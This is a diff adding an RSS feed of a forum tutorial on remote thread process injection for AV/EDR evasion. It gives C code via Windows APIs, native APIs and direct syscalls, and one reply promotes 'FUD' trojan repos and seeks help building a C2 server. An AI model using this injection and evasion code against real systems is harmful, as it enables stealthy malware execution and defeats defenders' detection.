@@ -1,0 +1,710 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+    <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399</link>
+    <description>In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs.
+
+[Process Injection](https://attack.mitre.org/techniques/T1055/) is one of the techniques that is used to evade the defense mechanism. Remote Thread Injection (aka CreateRemoteThread) is one of the simple and reliable sub technique. it works by injecting the shellcode (payload) into the context of another eligible process and creates a thread for that process to run the payload.
+```
+                                                                                                   
+          +-------------------+                                          +-------------------+     
+          |                   |                                          |                   |     
+          |                   |                                          |                   |     
+          |  Notepad Process  |                                          |  Malware Process  |     
+          |                   |                                          |                   |     
+          |                   |           1 allocating space             |                   |     
+          |-------------------| &lt;--------------------------------------  |                   |     
+          |     shellcode     |                                          |                   |     
+          |                   |           2 writing shellcode            |                   |     
+          +-------------------+ &lt;--------------------------------------  +-------------------+     
+                 ^                                                         |                       
+                 |                                                         |                       
+                 |                                                         |                       
+                 |                                                         |                       
+                 v             3 creating a remote thread to run shellcode |                       
+             +---------+                                                   |                       
+             |         |  &lt;------------------------------------------------+                       
+             | thread  |                                                                           
+             |         |                                                                           
+             +---------+                                                                           
+                                                                                                   
+```
+*figure 1*
+
+We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. the following picture shows how standard windows APIs, Native APIs, and direct syscalls work in windows architecture.
+```
+                                  +------------------------------+                                  
+                                  |                              |                                  
+                      +-----------|     Application Process      |----------------+                 
+                      |           |                              |                |                 
+                      |           +------------------------------+                |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           | Standard Windows API         |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           v                               |                 
+                      |           +------------------------------+                |                 
+                      |           |                              |                |                 
+       Native API     |           |          kernel32.dll        |                |                 
+                      |           |                              |                |                 
+                      |           +------------------------------+                |  Direct Syscalls
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           v                               |                 
+                      |           +------------------------------+                |                 
+                      |           |                              |                |                 
+                      +---------&gt; |           Ntdll.dll          |                |                 
+                                  |                              |                |                 
+ User-Mode                        +------------------------------+                |                 
+                                                  |                               |                 
+                                                  |                               |                 
+ -------------------------------------------------|-------------------------------|-----------------
+                                                  |                               |                 
+                                                  |                               |                 
+ Kernel-Mode                                      |                               |                 
+                                  +---------------v--------------+                |                 
+                                  |                              |                |                 
+                                  |         ntoskrnl.exe         | &lt;--------------+                 
+                                  |                              |                                  
+                                  +------------------------------+                                  
+```
+*figure 2*
+
+## Standard Windows APIs
+
+### pros:
+
+* easy to use
+
+### cons:
+
+* detectable by most AV/EDRs
+
+we start by using standard Windows APIs as it is simpler than two other ways. First, we need to find our target process ID. We create a function called  `find_process`  that gets a process name and it uses [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) API to get the list of current processes and uses [Process32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first) and [Process32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next) to go through them one by one and compare the name of the processes with our target process.  **Process32First**  and  **Process32Next**  APIs get a pointer to [PROCESSENTRY32](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) struct that could hold information about processes like its name and id. If it succeeds to find the process it returns its process ID.
+```
+DWORD find_process(char *process_name){
+
+	PROCESSENTRY32 process_entry;
+	process_entry.dwSize = sizeof(PROCESSENTRY32);
+
+	//get the list of processes
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	//check processes to find TARGET_PROCESS_NAME
+	if (Process32First(snapshot, &amp;process_entry) == TRUE){
+		
+        	while (Process32Next(snapshot, &amp;process_entry) == TRUE){
+        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
+				    CloseHandle(snapshot);
+				    return process_entry.th32ProcessID;
+            	}
+        	}
+    	}
+
+	CloseHandle(snapshot);
+	return 0;
+}
+```
+
+for the next step, we need to open our target process using the [OpenProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess) function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.
+
+```
+HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
+```
+
+now we need to allocate space for our shellcode in the target process using the [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. we should allocate this space with  **PAGE_EXECUTE_READWRITE**  (Read, Write, Execute) permission. this function returns the base address of the allocated region.
+
+```
+ LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+```
+
+now we should write our shellcode into our allocated memory region using the [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) function.
+
+```
+WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
+```
+
+after all, it’s time to create a thread in the target process and run the shellcode that we previously wrote into a memory page. we use the [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) function. we should also pass 0 as the  **dwCreationFlags**  parameter to run the thread immediately after creation.
+
+```
+CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
+```
+
+to compile the code in kali, we use  **MinGW**.
+
+```
+x86_64-w64-mingw32-gcc main.c -o rti.exe
+```
+
+we send the output to our windows machine and run it. if we open  **process hacker**  and take a look at the  **notepad.exe**  process. in the memory section there is only one memory page with RWX permission which is suspicious. if we open it we can see our shellcode inside it.
+
+![process-hacker-notepad|501x500](upload://effXrKa174oyvibfBufispBnHCJ.png) 
+*image 1*
+
+## Native API
+
+### pros:
+
+* bypass some of the AV/EDRs
+
+### cons:
+
+* hard to use
+* still detectable by most AV/EDRs
+* may not work on all windows versions
+
+In order to interact with the operating system, programmers use Standard APIs (Win 32 APIs) that are recommended by Microsoft. Standard Windows APIs are a kind of wrapper for Native APIs. Native APIs or Undocumented APIs could be found in the ntdll.dll library. Microsoft doesn’t recommend using these APIs. if you look at the second diagram you can see how these APIs are working. native APIs also interact with os kernel using syscalls. Microsoft uses this architecture because it can change the OS kernel without affecting the standard APIs.
+
+Native APIs are also called undocumented APIs because you can’t usually find official documentats to use them. we can find a way of using them mostly by seeing other people’s code, unofficial documents, or researching around them to see how they work. most of these APIs names start with Nt or Zw.
+
+In the previous section, we used standard APIs to do our job. here we go one layer deeper and use native APIs. we have a couple of more steps to use NTAPIS. for using Native APIs. first, we need to load the ntdll.dll into our malware process. then we should define function pointers with the exact same format as the original function that we want to use, and export the base address of these functions to initialize these pointers.
+
+for loading ntdll.dll or any other dll dynamically into our running process, we use the [LoadLibraryW](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) function and it returns a handle to that library.
+
+```
+HMODULE hNtdll = LoadLibraryW(L&quot;ntdll&quot;);
+```
+
+then we define our function pointer type and get the base address of the function using the [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function and assign it to the pointer. here is the example for [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess).
+
+```
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
+pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, &quot;NtOpenProcess&quot;);
+```
+
+as you can see we defined our function type with the same parameters as the  **NtOpenProcess**  function. you should do this for all  **NtWriteVirtualMemory** ,  **NtAllocateVirtualMemory** ,  **NtCreateThreadEx**  functions. for finding the parameter and structure of an undocumented api you can use http://undocumented.ntinternals.net/. but you may not find all the function definitions in it. you can search for it and see other people’s codes or even looking inside the ntdll.dll library to see how it exactly works.
+
+### NtOpenProcess
+
+like the previous section, we start by opening our target process but this time using [NtOpenProcess](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess). this function does not return a Handle to our target process but we need to pass a handle pointer as the first argument(pass by reference). we should also pass a pointer to an [OBJECT_ATTRIBUTES](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes) structure and a pointer to  **Client ID**  struct so let’s define them. we should also initialize  **OBJECT_ATTRIBUTES**  using [InitializeObjectAttributes](https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes) macro and define  **UNICODE_STRING**  struct.
+
+```
+#define InitializeObjectAttributes(p,n,a,r,s) { \
+(p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES); \
+(p)-&gt;RootDirectory = (r); \
+(p)-&gt;Attributes = (a); \
+(p)-&gt;ObjectName = (n); \
+(p)-&gt;SecurityDescriptor = (s); \
+(p)-&gt;SecurityQualityOfService = NULL; \
+}
+
+typedef struct _CLIENT_ID
+{
+	PVOID UniqueProcess;
+	PVOID UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+
+typedef struct _OBJECT_ATTRIBUTES {
+	ULONG           Length;
+	HANDLE          RootDirectory;
+	PUNICODE_STRING ObjectName;
+	ULONG           Attributes;
+	PVOID           SecurityDescriptor;
+	PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;
+
+
+OBJECT_ATTRIBUTES oa;
+InitializeObjectAttributes(&amp;oa, NULL,0,NULL,NULL);
+CLIENT_ID ci = { (HANDLE)procid, NULL };
+```
+
+now we can use  **NtOpenProcess**
+
+```
+NtOpenProcess(&amp;target_process_handle,PROCESS_ALL_ACCESS, &amp;oa, &amp;ci);
+```
+
+### NtAllocateVirtualMemory
+
+we allocate memory in target process using the [NtAllocateVirtualMemory](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) function. we define the function prototype.
+
+```
+typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
+```
+
+then we get the base address of the function.
+
+```
+pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);
+```
+
+and we call it
+
+```
+NtAllocateVirtualMemory(target_process_handle, &amp;remote_process_buffer, 0,&amp;buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+```
+
+we passed a void pointer named  **remote_process_buffer**  that will be the base address of the allocated space.
+
+### NtWriteVirtualMemory
+
+we define [NtWriteVirtualMemory](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html) function prototype like previous steps. we should pass our shellcode, the length of the shellcode, and the base address of the allocated space as arguments.
+
+```
+typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
+pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, &quot;NtWriteVirtualMemory&quot;);
+NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
+```
+
+### NtCreateThreadEx
+
+now it’s time to create a thread in our target process and run our shellcode. we use  **NtCreateThreadEx**  to create a remote thread in the target process and run our shellcode. we should pass 0 as the  **CreateFlag**  parameter to run the thread immediately after creation and 0x1FFFFF (PROCESS_ALL_ACCESS) as the  **DesiredAccess**  parameter. to see the function prototype, you can look [here](https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814).
+
+```
+NtCreateThreadEx(&amp;thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
+```
+
+that’s it for Native APIs. let’s go one step deeper and use syscalls.
+
+## Direct Syscalls
+
+### pros:
+
+* undetectable by all of the API monitoring tools that work on user-space
+
+### cons:
+
+* May not work on all windows versions
+* hard to use
+
+In the previous steps, any API monitoring application and EDRs could detect our API calls and ruin our operation. now if we use direct syscalls nothing in userland can detect our API calls. but as [sysmon](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) works as a driver in kernel space we can’t do anything about it. so, it is strongly recommended to use sysmon.
+
+One of the disadvantages of using syscalls is that their work is dependent on the version of OS and our code may not work on different windows versions. However, by using a great tool like [SysWhisper](https://github.com/jthuraisamy/SysWhispers) we can generate syscalls for different windows versions. you can run the following command to generate syscalls for our desired functions for windows 10.
+
+```
+syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
+```
+
+this command generates two output files  **syscall.asm**  and  **syscall.h**  that we add to our visual studio project. then we should enable [MASM](https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160) in the project and include the header file in our main code.
+
+afterward using the functions is like Native APIs but here we don’t need to load ntdll.dll, get the base address of the functions, and defining function prototypes. I think SysWhisper has made it really easy to utilize syscalls.
+
+You can find the codes for this post on my [Github](https://github.com/AlionGreen/remote-thread-injection).
+
+## Credit:
+thanks, [@0x00dtm](https://twitter.com/0x00dtm) for guiding me through Native APIs and Syscalls. it would be much harder without his help.
+
+## References:
+
+https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
+
+https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/
+
+https://blog.dylan.codes/defending-your-malware/</description>
+    
+    <lastBuildDate>Sat, 30 Jan 2021 18:17:36 +0000</lastBuildDate>
+    <category>Malware</category>
+    <atom:link href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/10">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/10</link>
+        <pubDate>Thu, 29 Apr 2021 11:44:06 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-10</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[qyq]]></dc:creator>
+        <description><![CDATA[
+            <p>thank what a nice job</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/9</link>
+        <pubDate>Sat, 30 Jan 2021 18:17:36 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-9</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[alion]]></dc:creator>
+        <description><![CDATA[
+            <p>every AV/EDR has its own set of functions to hook. also, remote thread injection has some limitations as it is one of the basic and well known techniques of process injection. but it could still be useful  <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/8</link>
+        <pubDate>Sat, 16 Jan 2021 17:23:52 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-8</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[alexa]]></dc:creator>
+        <description><![CDATA[
+            <p>nice tutorial, although i think using these functions will make your malware suspicious so that it will get blocked , i didnt try it but i read a lot of articles, some anti viruses will try to hook these functions if they thought it is suspicious, anyway thank you for this tutorial, i build an malware that can bypass windows defender, and execute meterpreter shellcode, the problem is i need someone else to build the c2 server with, if anyone have some time please take a look at my post in github : <a href="https://github.com/alexa872/EVA---FUD" rel="noopener nofollow ugc">https://github.com/alexa872/EVA---FUD</a><br>
+and i got another one that uses a loader to load a dll can also bypass windows 10<br>
+:: <a href="https://github.com/alexa872/Peony----TROJAN" rel="noopener nofollow ugc">https://github.com/alexa872/Peony----TROJAN</a></p>
+<p>im looking to add some go code to my malware, as well as to build the c2 server with it, or with python … thank you and have a nice day</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/7</link>
+        <pubDate>Thu, 14 Jan 2021 04:53:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-7</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[slowpokeeh]]></dc:creator>
+        <description><![CDATA[
+            <p>Great Tutorial!<br>
+Ive been trying to mess a bit with process injection, but unfortunately my calc.exe process gets spawned and instantly suspended. Im probably missing something.</p>
+<p>I hope to read more good articles like that from you in the future!<br>
+Very good work.</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/6</link>
+        <pubDate>Thu, 07 Jan 2021 21:41:08 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-6</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[alion]]></dc:creator>
+        <description><![CDATA[
+            <p>thanks man. that really motivates me to keep on writing.</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/5</link>
+        <pubDate>Wed, 30 Dec 2020 21:45:34 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-5</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[Alekhine]]></dc:creator>
+        <description><![CDATA[
+            <p>Really great stuff man. This kind of knowledge is hard to find. Keep writing, we appreciate it!</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/4</link>
+        <pubDate>Tue, 29 Dec 2020 20:42:01 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-4</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[alion]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks pry,<br>
+your kind words encourage me to do more of these.</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/3</link>
+        <pubDate>Tue, 29 Dec 2020 18:42:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-3</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[pry0cc]]></dc:creator>
+        <description><![CDATA[
+            <p>Awesome first article!!!</p>
+<p>I really like how you explained how all the different types of API and how they link together - you broke it down in a really nice readable way! I learned a lot from reading this byte-size post!</p>
+<p>Great job!</p>
+          <p><a href="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399/2</link>
+        <pubDate>Tue, 29 Dec 2020 13:45:55 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24399-2</guid>
+        <source url="https://0x00sec.org/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
+      </item>
+      <item>
+        <title>Process Injection: Remote Thread Injection or CreateRemoteThread</title>
+        <dc:creator><![CDATA[alion]]></dc:creator>
+        <description><![CDATA[
+            <p>In Every Red Team Operation, the goal of the Team is to Stay Stealthy and hide campaign operation from the blue team. From getting the initial access to hiding the C2 connections and exfiltrating data, they use various techniques and procedures to do that. The first step of every campaign is to get initial access. They use customized malware and payloads to circumvent and evade defending tools such as AVs and EDRs.</p>
+<p><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener nofollow ugc">Process Injection</a> is one of the techniques that is used to evade the defense mechanism. Remote Thread Injection (aka CreateRemoteThread) is one of the simple and reliable sub technique. it works by injecting the shellcode (payload) into the context of another eligible process and creates a thread for that process to run the payload.</p>
+<pre><code class="lang-auto">                                                                                                   
+          +-------------------+                                          +-------------------+     
+          |                   |                                          |                   |     
+          |                   |                                          |                   |     
+          |  Notepad Process  |                                          |  Malware Process  |     
+          |                   |                                          |                   |     
+          |                   |           1 allocating space             |                   |     
+          |-------------------| &lt;--------------------------------------  |                   |     
+          |     shellcode     |                                          |                   |     
+          |                   |           2 writing shellcode            |                   |     
+          +-------------------+ &lt;--------------------------------------  +-------------------+     
+                 ^                                                         |                       
+                 |                                                         |                       
+                 |                                                         |                       
+                 |                                                         |                       
+                 v             3 creating a remote thread to run shellcode |                       
+             +---------+                                                   |                       
+             |         |  &lt;------------------------------------------------+                       
+             | thread  |                                                                           
+             |         |                                                                           
+             +---------+                                                                           
+                                                                                                   
+</code></pre>
+<p><em>figure 1</em></p>
+<p>We implement remote thread injection using standard Windows APIs, native APIs, and direct syscalls. each of these implementations has its own pros and cons. the following picture shows how standard windows APIs, Native APIs, and direct syscalls work in windows architecture.</p>
+<pre><code class="lang-auto">                                  +------------------------------+                                  
+                                  |                              |                                  
+                      +-----------|     Application Process      |----------------+                 
+                      |           |                              |                |                 
+                      |           +------------------------------+                |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           | Standard Windows API         |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           v                               |                 
+                      |           +------------------------------+                |                 
+                      |           |                              |                |                 
+       Native API     |           |          kernel32.dll        |                |                 
+                      |           |                              |                |                 
+                      |           +------------------------------+                |  Direct Syscalls
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           |                               |                 
+                      |                           v                               |                 
+                      |           +------------------------------+                |                 
+                      |           |                              |                |                 
+                      +---------&gt; |           Ntdll.dll          |                |                 
+                                  |                              |                |                 
+ User-Mode                        +------------------------------+                |                 
+                                                  |                               |                 
+                                                  |                               |                 
+ -------------------------------------------------|-------------------------------|-----------------
+                                                  |                               |                 
+                                                  |                               |                 
+ Kernel-Mode                                      |                               |                 
+                                  +---------------v--------------+                |                 
+                                  |                              |                |                 
+                                  |         ntoskrnl.exe         | &lt;--------------+                 
+                                  |                              |                                  
+                                  +------------------------------+                                  
+</code></pre>
+<p><em>figure 2</em></p>
+<h2>Standard Windows APIs</h2>
+<h3>pros:</h3>
+<ul>
+<li>easy to use</li>
+</ul>
+<h3>cons:</h3>
+<ul>
+<li>detectable by most AV/EDRs</li>
+</ul>
+<p>we start by using standard Windows APIs as it is simpler than two other ways. First, we need to find our target process ID. We create a function called  <code>find_process</code>  that gets a process name and it uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" rel="noopener nofollow ugc">CreateToolhelp32Snapshot</a> API to get the list of current processes and uses <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first" rel="noopener nofollow ugc">Process32First</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next" rel="noopener nofollow ugc">Process32Next</a> to go through them one by one and compare the name of the processes with our target process.  <strong>Process32First</strong>  and  <strong>Process32Next</strong>  APIs get a pointer to <a href="https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32" rel="noopener nofollow ugc">PROCESSENTRY32</a> struct that could hold information about processes like its name and id. If it succeeds to find the process it returns its process ID.</p>
+<pre><code class="lang-auto">DWORD find_process(char *process_name){
+
+	PROCESSENTRY32 process_entry;
+	process_entry.dwSize = sizeof(PROCESSENTRY32);
+
+	//get the list of processes
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+	//check processes to find TARGET_PROCESS_NAME
+	if (Process32First(snapshot, &amp;process_entry) == TRUE){
+		
+        	while (Process32Next(snapshot, &amp;process_entry) == TRUE){
+        		if (stricmp(process_entry.szExeFile, process_name) == 0){  
+				    CloseHandle(snapshot);
+				    return process_entry.th32ProcessID;
+            	}
+        	}
+    	}
+
+	CloseHandle(snapshot);
+	return 0;
+}
+</code></pre>
+<p>for the next step, we need to open our target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" rel="noopener nofollow ugc">OpenProcess</a> function. We pass our parameters including the target process id that we get from the previous step and it returns a handle to that process.</p>
+<pre><code class="lang-auto">HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_process_id);
+</code></pre>
+<p>now we need to allocate space for our shellcode in the target process using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex" rel="noopener nofollow ugc">VirtualAllocEx</a> function. we should allocate this space with  <strong>PAGE_EXECUTE_READWRITE</strong>  (Read, Write, Execute) permission. this function returns the base address of the allocated region.</p>
+<pre><code class="lang-auto"> LPVOID remote_process_buffer = VirtualAllocEx(target_process_handle, NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</code></pre>
+<p>now we should write our shellcode into our allocated memory region using the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory" rel="noopener nofollow ugc">WriteProcessMemory</a> function.</p>
+<pre><code class="lang-auto">WriteProcessMemory(target_process_handle, remote_process_buffer, buf, sizeof(buf), NULL);
+</code></pre>
+<p>after all, it’s time to create a thread in the target process and run the shellcode that we previously wrote into a memory page. we use the <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread" rel="noopener nofollow ugc">CreateRemoteThread</a> function. we should also pass 0 as the  <strong>dwCreationFlags</strong>  parameter to run the thread immediately after creation.</p>
+<pre><code class="lang-auto">CreateRemoteThread(target_process_handle, NULL, 0,(LPTHREAD_START_ROUTINE) remote_process_buffer,NULL,0, NULL);
+</code></pre>
+<p>to compile the code in kali, we use  <strong>MinGW</strong>.</p>
